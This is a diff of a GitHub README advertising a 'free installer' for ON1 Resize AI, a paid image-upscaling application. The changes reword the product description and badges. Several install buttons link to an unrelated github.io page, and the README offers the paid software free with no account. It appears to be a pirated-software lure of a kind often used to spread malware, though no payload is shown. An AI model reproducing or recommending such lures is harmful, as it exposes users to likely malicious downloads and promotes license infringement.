@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Image+Upscaler-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Image+Upscaling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 ON1 Resize AI Free Installer** — ON1 Resize AI is a professional image resizing and upscaling software using AI to enlarge photos while preserving sharpness and detail. Works without internet access, no account required. Full offline installation.
+**💻 ON1 Resize AI Free Installer** — ON1 Resize AI is a standalone and plugin image upscaling application that uses AI to enlarge images while preserving detail. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1%20Resize%20AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1+Resize+AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About ON1 Resize AI
 
-ON1 Resize AI is a professional image resizing and upscaling software using AI to enlarge photos while preserving sharpness and detail. It allows printing photos at dramatically larger sizes than their original resolution would typically allow.
+ON1 Resize AI is a standalone and plugin image upscaling application that uses AI to enlarge images while preserving detail. Upscale photos up to 10x their original size for large-format printing, using machine learning models that intelligently fill in detail rather than simply interpolating pixels. Works as a standalone application and as a plugin for Lightroom, Photoshop, and Capture One.
 
 ---
 
 ## ❌ Problem: ON1 Resize AI is hard to access
 
-- **Paid License** — Requires purchase; subscription option available
-- **Single Purpose** — Upscaling only; requires separate editor for other photo adjustments
-- **Competition** — Topaz Gigapixel AI is the preferred choice in most professional comparisons
-- **ON1 Ecosystem** — Best value as part of the ON1 Photo RAW bundle
+- **Commercial License** — Paid standalone or subscription as part of ON1 suite
+- **Specialized Use** — Single-purpose tool for image enlargement
+- **GPU Preferred** — AI processing significantly faster with capable GPU
+- **Competition** — Topaz Gigapixel AI widely considered the market leader in AI upscaling
 
 ---
 
@@ -81,7 +81,7 @@ ON1 Resize AI is a professional image resizing and upscaling software using AI t
 
 <div align="center">
 
-[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1%20Resize%20AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1+Resize+AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ ON1 Resize AI is a professional image resizing and upscaling software using AI t
 
 ---
 
-**ON1 Resize AI Free Installer** — ON1 Resize AI is a professional image resizing and upscaling software using AI to enlarge photos while preserving sharpness and detail. Install without internet connection today!
+**ON1 Resize AI Free Installer** — ON1 Resize AI is a standalone and plugin image upscaling application that uses AI to enlarge images while preserving detail. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1%20Resize%20AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ON1 Resize AI](https://img.shields.io/badge/⬇_Install_ON1+Resize+AI-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
